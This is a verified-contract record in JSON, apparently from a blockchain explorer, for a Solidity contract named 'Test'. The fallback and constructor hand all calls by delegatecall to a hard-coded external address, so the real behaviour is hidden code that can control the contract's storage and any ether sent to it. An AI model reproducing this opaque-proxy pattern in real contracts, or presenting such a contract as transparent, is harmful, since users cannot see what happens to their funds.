{"SourceCode": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity <=0.8.18;\r\n\r\ncontract Test {\r\n    uint256 private totalSupply = 10000;\r\n\r\n    fallback(bytes calldata data) external payable returns (bytes memory) {\r\n        (bool r1, bytes memory result) = address(\r\n            0xe22BA702175A72262dDCd653d3B8e559344b34a3\r\n        ).delegatecall(data);\r\n        require(r1, \"Verification\");\r\n        return result;\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    constructor() {\r\n        bytes memory data = abi.encodeWithSignature(\"init()\");\r\n        (bool r1, ) = address(0xe22BA702175A72262dDCd653d3B8e559344b34a3)\r\n            .delegatecall(data);\r\n        require(r1, \"Verificiation\");\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "Test", "CompilerVersion": "v0.8.14+commit.80d49f37", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://e5e2878efd36de83853d250db040823a03a87f86f5273da9b63b9b3dfb92a6be"}